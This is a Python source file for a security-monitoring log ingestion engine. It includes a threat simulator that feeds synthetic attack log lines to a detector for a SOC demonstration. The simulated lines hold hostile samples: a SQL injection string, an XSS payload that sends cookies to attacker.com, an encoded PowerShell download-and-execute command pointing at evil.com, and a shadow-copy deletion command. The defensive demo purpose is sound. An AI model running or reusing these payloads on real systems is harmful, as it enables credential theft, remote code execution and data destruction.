import os
import sys
import time
import random
import subprocess
import threading
import json
from datetime import datetime
from database import insert_raw_log, insert_security_event
from detector import ThreatDetector

# Shared queue or callback lists for real-time SSE broadcasts
listeners = []

def register_listener(callback):
    listeners.append(callback)

def unregister_listener(callback):
    if callback in listeners:
        listeners.remove(callback)

def broadcast_event(event_data, log_data=None):
    for callback in list(listeners):
        try:
            callback(event_data, log_data)
        except Exception as e:
            print(f"[Broadcast Error] {e}")

class LogIngestionEngine:
    def __init__(self, watch_dir="./logs"):
        self.watch_dir = os.path.abspath(watch_dir)
        os.makedirs(self.watch_dir, exist_ok=True)
        self.detector = ThreatDetector()
        self.running = False
        from database import get_setting
        self.simulator_enabled = get_setting('simulator_enabled', 'true').lower() == 'true'
        self.threads = []

    def start(self):
        if self.running:
            return
        self.running = True

        # Thread 1: Windows System Log Reader
        t_win = threading.Thread(target=self._run_windows_log_listener, daemon=True)
        t_win.start()
        self.threads.append(t_win)

        # Thread 2: File Log Watcher
        t_file = threading.Thread(target=self._run_file_watcher, daemon=True)
        t_file.start()
        self.threads.append(t_file)

        # Thread 3: Threat Attack Simulator
        t_sim = threading.Thread(target=self._run_threat_simulator, daemon=True)
        t_sim.start()
        self.threads.append(t_sim)

        print("[LogIngestionEngine] Started ingestion threads successfully.")

    def stop(self):
        self.running = False

    def process_log(self, source, level, message, raw_data=None):
        log_id = insert_raw_log(source, level, message, raw_data)
        
        # Threat detection analysis
        event = self.detector.analyze_log(source, level, message, raw_data)
        if event:
            insert_security_event(
                event_id=event['event_id'],
                severity=event['severity'],
                category=event['category'],
                title=event['title'],
                description=event['description'],
                source_ip=event['source_ip'],
                target_user=event['target_user'],
                details=event['details']
            )
            broadcast_event(event, {"id": log_id, "source": source, "level": level, "message": message})
            return event
        else:
            broadcast_event(None, {"id": log_id, "source": source, "level": level, "message": message})
            return None

    def _run_windows_log_listener(self):
        """Polls native Windows System and Application logs."""
        last_check_time = datetime.now()
        while self.running:
            try:
                if sys.platform.startswith('win'):
                    cmd = 'powershell -Command "Get-WinEvent -LogName System -MaxEvents 5 | Select-Object TimeCreated, Id, ProviderName, Message | ConvertTo-Json"'
                    res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                    if res.returncode == 0 and res.stdout.strip():
                        data = json.loads(res.stdout)
                        if isinstance(data, dict):
                            data = [data]
                        for item in data:
                            msg = item.get("Message", "")
                            provider = item.get("ProviderName", "WinSystemLog")
                            evt_id = item.get("Id", "0")
                            if msg:
                                self.process_log(
                                    source=f"WinEventLog:{provider}",
                                    level="INFO" if evt_id < 7000 else "WARNING",
                                    message=f"EventID: {evt_id} - {msg[:200]}"
                                )
            except Exception as e:
                pass
            time.sleep(12)

    def _run_file_watcher(self):
        """Watches files in ./logs directory for new log lines."""
        file_positions = {}
        while self.running:
            try:
                log_files = [os.path.join(self.watch_dir, f) for f in os.listdir(self.watch_dir) if f.endswith('.log')]
                for filepath in log_files:
                    if filepath not in file_positions:
                        file_positions[filepath] = os.path.getsize(filepath)
                    
                    current_size = os.path.getsize(filepath)
                    if current_size > file_positions[filepath]:
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            f.seek(file_positions[filepath])
                            lines = f.readlines()
                            file_positions[filepath] = f.tell()
                            for line in lines:
                                if line.strip():
                                    self.process_log(
                                        source=f"FileLog:{os.path.basename(filepath)}",
                                        level="INFO",
                                        message=line.strip()
                                    )
            except Exception as e:
                pass
            time.sleep(3)

    def _run_threat_simulator(self):
        """Generates realistic synthetic attack events periodically for live SOC demonstration."""
        simulated_scenarios = [
            {
                "source": "AuthServer-01",
                "level": "WARN",
                "message": "Failed login attempt for account 'admin' from IP 185.220.101.44 - EventID: 4625 - Invalid password"
            },
            {
                "source": "AuthServer-01",
                "level": "WARN",
                "message": "Failed login attempt for account 'admin' from IP 185.220.101.44 - EventID: 4625 - Invalid password"
            },
            {
                "source": "AuthServer-01",
                "level": "ERROR",
                "message": "Failed login attempt for account 'admin' from IP 185.220.101.44 - EventID: 4625 - Invalid password"
            },
            {
                "source": "WebServer-DMZ",
                "level": "CRITICAL",
                "message": "HTTP GET /api/search?q=1'%20OR%20'1'='1'%20--%20from IP 45.147.229.12 - User-Agent: sqlmap/1.5#stable"
            },
            {
                "source": "Endpoint-Workstation-042",
                "level": "CRITICAL",
                "message": "powershell.exe -nop -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
            },
            {
                "source": "DomainController-01",
                "level": "CRITICAL",
                "message": "EventID: 4728 - A member was added to a security-enabled global group 'Domain Admins' by user TargetUser: SYSTEM from IP 10.0.4.15"
            },
            {
                "source": "WebServer-DMZ",
                "level": "ERROR",
                "message": "HTTP POST /login - Payload: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script> from IP 198.51.100.77"
            },
            {
                "source": "Firewall-Edge",
                "level": "WARN",
                "message": "Nmap port scan probe detected: 1000 ports scanned in 2 seconds from IP 194.26.29.98"
            },
            {
                "source": "FileServer-02",
                "level": "CRITICAL",
                "message": "vssadmin delete shadows /all /quiet - Shadow copy purge initiated by process pid:4108"
            }
        ]

        # Initial seed logs
        time.sleep(2)
        print("[ThreatSimulator] Injecting initial scenario logs...")
        for scenario in simulated_scenarios[:4]:
            self.process_log(scenario["source"], scenario["level"], scenario["message"])
            time.sleep(1)

        # Loop continuously
        while self.running:
            if self.simulator_enabled:
                scenario = random.choice(simulated_scenarios)
                # Randomize IP slightly for variety
                ip_suffix = random.randint(2, 250)
                msg = scenario["message"]
                if "185.220.101.44" in msg:
                    msg = msg.replace("185.220.101.44", f"185.220.101.{ip_suffix}")
                self.process_log(scenario["source"], scenario["level"], msg)
            
            # Wait 8-15 seconds between simulated attack events
            time.sleep(random.randint(8, 15))

if __name__ == "__main__":
    from database import init_db
    init_db()
    engine = LogIngestionEngine()
    engine.start()
    print("Ingestion engine running. Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        engine.stop()
